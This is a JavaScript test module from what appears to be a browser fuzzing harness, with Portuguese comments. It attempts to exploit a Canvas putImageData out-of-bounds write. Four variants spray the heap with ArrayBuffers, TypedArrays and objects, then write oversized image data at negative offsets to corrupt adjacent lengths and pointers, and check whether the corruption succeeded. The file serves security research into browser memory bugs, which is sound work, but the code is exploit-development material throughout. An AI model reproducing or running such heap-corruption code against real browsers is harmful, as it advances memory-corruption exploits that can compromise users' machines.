\'use strict\';\n/**
 * Teste 12 — Canvas putImageData OOB: Heap Corruption EXPLOITAÇÃO
 *
 * Bug confirmado no Teste 5H:
 *   padrão 0x42/0x43/0x44/0xFF encontrado em região não-overlap (16 pixels)
 *   → OOB WRITE com dados controlados CONFIRMADO
 *
 * Estratégia de exploração:
 *   1. Criar canvas adjacente a estruturas de memória controladas
 *   2. Usar putImageData OOB para sobrescrever headers/lengths
 *   3. Verificar corrupção de ArrayBuffer, JSObject, TypedArray
 *
 * Variantes:
 *   A — Sobrescrever length de ArrayBuffer adjacente
 *   B — Sobrescrever butterfly pointer de JSObject
 *   C — Corromper TypedArray (data pointer / length)
 *   D — Heap spray + OOB para encontrar alvo
 */
(function (global) {
  global.FuzzerTests = global.FuzzerTests || {};

  global.FuzzerTests[\'12\'] = {
    id      : 12,
    name    : \'Canvas putImageData OOB — Heap Corruption EXPLOITAÇÃO\',
    category: \'Canvas-Exploit\',
    timeout : 10000,

    run: function () {
      return new Promise(function (resolve) {
        var anomalies = [];

        /* ── Variante A: Corromper length de ArrayBuffer adjacente ── */
        (function variantA() {
          try {
            /* Criar múltiplos ArrayBuffers de tamanho conhecido */
            var buffers = [];
            for (var i = 0; i < 50; i++) {
              buffers.push(new ArrayBuffer(64));
            }

            /* Preencher com padrão reconhecível */
            for (var i = 0; i < buffers.length; i++) {
              var v = new Uint32Array(buffers[i]);
              v[0] = 0xDEADBEEF;
              v[1] = 64; /* length esperado */
            }

            /* Canvas pequeno adjacente na memória */
            var canvas = document.createElement(\'canvas\');
            canvas.width = 4; canvas.height = 4;
            var ctx = canvas.getContext(\'2d\');

            /* ImageData grande com padrão que parece length (0x00000100 = 256) */
            var data = ctx.createImageData(128, 128);
            for (var i = 0; i < data.data.length; i += 4) {
              data.data[i]     = 0x00;
              data.data[i + 1] = 0x01;
              data.data[i + 2] = 0x00;
              data.data[i + 3] = 0x00;
            }

            /* putImageData com offset negativo — tentar atingir ArrayBuffers */
            ctx.putImageData(data, -60, -60);

            /* Verificar se algum ArrayBuffer foi corrompido */
            var corrupted = 0;
            for (var i = 0; i < buffers.length; i++) {
              if (buffers[i].byteLength !== 64) {
                corrupted++;
                anomalies.push(\'A: ArrayBuffer[\' + i + \'] length corrompido: \' +
                  buffers[i].byteLength + \' (esperado 64)\');
              } else {
                var check = new Uint32Array(buffers[i]);
                if (check[0] !== 0xDEADBEEF) {
                  corrupted++;
                  anomalies.push(\'A: ArrayBuffer[\' + i + \'] conteúdo corrompido: 0x\' +
                    check[0].toString(16));
                }
              }
            }
            if (corrupted === 0) {
              /* Sem corrupção detectável — tentar com offset diferente */
            }
          } catch (e) {
            anomalies.push(\'A: \' + String(e));
          }
        }());

        /* ── Variante B: Corromper TypedArray (data pointer / length) ── */
        (function variantB() {
          try {
            var arrays = [];
            for (var i = 0; i < 30; i++) {
              var arr = new Uint32Array(16);
              arr[0] = 0xCAFEBABE;
              arr[1] = 16;
              arrays.push(arr);
            }

            var canvas = document.createElement(\'canvas\');
            canvas.width = 4; canvas.height = 4;
            var ctx = canvas.getContext(\'2d\');

            var data = ctx.createImageData(256, 256);
            /* Preencher com padrão que pode parecer ponteiro (0x0000FFFE...) */
            for (var i = 0; i < data.data.length; i += 4) {
              data.data[i]     = 0xFE;
              data.data[i + 1] = 0xFF;
              data.data[i + 2] = 0x00;
              data.data[i + 3] = 0x00;
            }

            ctx.putImageData(data, -120, -120);

            var corrupted = 0;
            for (var i = 0; i < arrays.length; i++) {
              if (arrays[i].length !== 16) {
                corrupted++;
                anomalies.push(\'B: TypedArray[\' + i + \'] length corrompido: \' + arrays[i].length);
              } else if (arrays[i][0] !== 0xCAFEBABE) {
                corrupted++;
                anomalies.push(\'B: TypedArray[\' + i + \'] conteúdo corrompido: 0x\' +
                  arrays[i][0].toString(16));
              }
            }
          } catch (e) {
            anomalies.push(\'B: \' + String(e));
          }
        }());

        /* ── Variante C: Heap spray de objetos com propriedade length ── */
        (function variantC() {
          try {
            var objects = [];
            for (var i = 0; i < 100; i++) {
              objects.push({
                length: 64,
                data: new Array(16).fill(i),
                marker: 0xBEEF
              });
            }

            var canvas = document.createElement(\'canvas\');
            canvas.width = 8; canvas.height = 8;
            var ctx = canvas.getContext(\'2d\');

            var data = ctx.createImageData(512, 512);
            for (var i = 0; i < data.data.length; i++) {
              data.data[i] = 0xFF;
            }

            ctx.putImageData(data, -250, -250);

            var corrupted = 0;
            for (var i = 0; i < objects.length; i++) {
              if (objects[i].length !== 64) {
                corrupted++;
                anomalies.push(\'C: objeto[\' + i + \'].length corrompido: \' + objects[i].length);
              }
              if (objects[i].marker !== 0xBEEF) {
                corrupted++;
                anomalies.push(\'C: objeto[\' + i + \'].marker corrompido: 0x\' +
                  objects[i].marker.toString(16));
              }
            }
          } catch (e) {
            anomalies.push(\'C: \' + String(e));
          }
        }());

        /* ── Variante D: Múltiplos canvases + OOB coordenado ── */
        (function variantD() {
          try {
            /* Criar grid de canvases pequenos */
            var canvases = [];
            for (var i = 0; i < 10; i++) {
              var c = document.createElement(\'canvas\');
              c.width = 8; c.height = 8;
              canvases.push({ canvas: c, ctx: c.getContext(\'2d\') });
            }

            /* Preencher cada canvas com cor diferente */
            for (var i = 0; i < canvases.length; i++) {
              var ctx = canvases[i].ctx;
              ctx.fillStyle = \'rgb(\' + i + \',\' + (255-i) + \',128)\';
              ctx.fillRect(0, 0, 8, 8);
            }

            /* Tentar OOB em cada canvas */
            for (var i = 0; i < canvases.length; i++) {
              var ctx = canvases[i].ctx;
              var data = ctx.createImageData(32, 32);
              for (var j = 0; j < data.data.length; j += 4) {
                data.data[j] = 0x41;
                data.data[j + 3] = 0xFF;
              }
              ctx.putImageData(data, -12, -12);
            }

            /* Verificar se OOB de um canvas afetou outro */
            var crossCorruption = 0;
            for (var i = 0; i < canvases.length; i++) {
              var pixel = canvases[i].ctx.getImageData(0, 0, 1, 1);
              /* O pixel deveria ter a cor original, não 0x41 */
              if (pixel.data[0] === 0x41) {
                crossCorruption++;
              }
            }
            if (crossCorruption > 0) {
              anomalies.push(\'D: \' + crossCorruption + \' canvases corrompidos por OOB de vizinho\');
            }
          } catch (e) {
            anomalies.push(\'D: \' + String(e));
          }
        }());

        setTimeout(function () {
          if (anomalies.length > 0) {
            resolve({ status: \'ANOMALY\', detail: anomalies.join(\' | \') });
          } else {
            resolve({ status: \'PASS\', detail: \'A-D sem corrupção detectável\' });
          }
        }, 1000);
      });
    }
  };

}(window));